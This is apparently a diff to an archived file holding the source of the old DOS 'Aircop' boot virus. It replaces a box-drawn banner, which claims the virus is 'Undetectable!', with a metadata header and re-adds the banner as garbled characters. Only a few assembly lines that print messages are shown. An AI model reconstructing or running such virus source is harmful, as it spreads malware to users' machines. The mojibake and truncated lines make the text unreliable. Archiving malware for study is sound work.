@@ -1,12 +1,23 @@
-ีออออออออออออออออออออออออออออออออออออออออออออออออออออธ
-ณ Aircop Virus (c)RABiD Source Code                  ณ
-ณ Ripped by : The Head Hunter [FS]                  ณ
-ณ                                                    ณ
-ณ Seem's this baby only work on Bare 360k Drive      ณ
-ณ System. Neat Anywayz. And it's Undetectable!       ณ
-ณ                                                    ณ
-ณ                                                    ณ
-ิออออออออออออออออออออออออออออออออออออออออออออออออออออพ
+; ------------------------------------------------------------
+; name      A
+; type      asm
+; cve       โ€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     โ€”
+; ------------------------------------------------------------
+๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝอธ
+๏ฟฝ Aircop Virus (c)RABiD Source Code                  ๏ฟฝ
+๏ฟฝ Ripped by : The Head Hunter [F๏ฟฝS]                  ๏ฟฝ
+๏ฟฝ                                                    ๏ฟฝ
+๏ฟฝ Seem's this baby only work on Bare 360k Drive      ๏ฟฝ
+๏ฟฝ System. Neat Anywayz. And it's Undetectable!       ๏ฟฝ
+๏ฟฝ                                                    ๏ฟฝ
+๏ฟฝ                                                    ๏ฟฝ
+๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝอพ
   MOV    AX, CS
   MOV    DS, AX
   MOV    SP, 03b6h
@@ -18,7 +29,8 @@
   INT    21h        ;"AIRCOP Test Version"
   MOV    DX, 03c3h
   MOV    AH, 09h
-  INT    21h        ;"
+  INT    21h        ;"
+
 
   MOV    DX, 04e5h
   MOV    AH, 09h
